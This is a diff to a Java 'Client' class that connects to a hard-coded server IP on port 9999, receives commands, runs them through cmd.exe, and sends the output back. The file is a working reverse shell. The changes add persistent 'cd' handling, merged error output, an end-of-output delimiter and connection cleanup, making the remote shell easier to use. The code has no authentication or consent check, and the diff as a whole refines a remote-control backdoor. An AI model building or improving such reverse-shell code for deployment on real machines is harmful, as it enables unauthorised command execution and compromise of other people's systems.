@@ -6,6 +6,8 @@ public class Client {
     private static BufferedReader in;
     private static BufferedWriter out;
 
+    private static String currentDirectory = System.getProperty("user.dir");
+
     public static void main(String[] args) {
         String host = "192.168.1.121"; // Change to your server IP
         int port = 9999;
@@ -28,39 +30,69 @@ public class Client {
                 }
 
                 String result = executeCommand(command);
-                out.write(result + "\n");
+                System.out.println("[LOG] Sending result back to server...");
+
+                out.write(result);
                 out.flush();
             }
 
-            socket.close();
         } catch (Exception e) {
+            System.err.println("[ERROR] Client exception: " + e.getMessage());
             e.printStackTrace();
+        } finally {
+            try {
+                if (socket != null) socket.close();
+                if (in != null) in.close();
+                if (out != null) out.close();
+                System.out.println("[LOG] Client disconnected.");
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
         }
     }
 
     private static String executeCommand(String command) {
         StringBuilder output = new StringBuilder();
-        try {
-            Process process = Runtime.getRuntime().exec(command);
-            BufferedReader reader = new BufferedReader(
-                    new InputStreamReader(process.getInputStream()));
-            BufferedReader errorReader = new BufferedReader(
-                    new InputStreamReader(process.getErrorStream()));
 
+        try {
+            // Handle 'cd' separately
+            if (command.toLowerCase().startsWith("cd")) {
+                String[] parts = command.split("\\s+", 2);
+                if (parts.length > 1) {
+                    File newDir = new File(currentDirectory, parts[1]).getCanonicalFile();
+                    if (newDir.exists() && newDir.isDirectory()) {
+                        currentDirectory = newDir.getAbsolutePath();
+                    } else {
+                        return "The system cannot find the path specified.\n" + currentDirectory + "> \n[END_OF_OUTPUT]\n";
+                    }
+                }
+                return currentDirectory + "> \n[END_OF_OUTPUT]\n";
+            }
+
+            // Execute normal commands
+            ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
+            builder.directory(new File(currentDirectory));
+            builder.redirectErrorStream(true);
+            Process process = builder.start();
+
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             String line;
             while ((line = reader.readLine()) != null) {
-                output.append(line).append("\n");
-            }
-            while ((line = errorReader.readLine()) != null) {
+                System.out.println("[LOG] Command output: " + line);
                 output.append(line).append("\n");
             }
 
+            process.waitFor();
             reader.close();
-            errorReader.close();
-        } catch (IOException e) {
-            output.append("Error executing command: ").append(e.getMessage());
+
+        } catch (Exception e) {
+            output.append("Error executing command: ").append(e.getMessage()).append("\n");
         }
 
-        return output.toString().trim();
+        // Append current directory and end-of-output delimiter
+        output.append(currentDirectory).append("> \n");
+        output.append("[END_OF_OUTPUT]\n");
+
+        return output.toString();
     }
 }
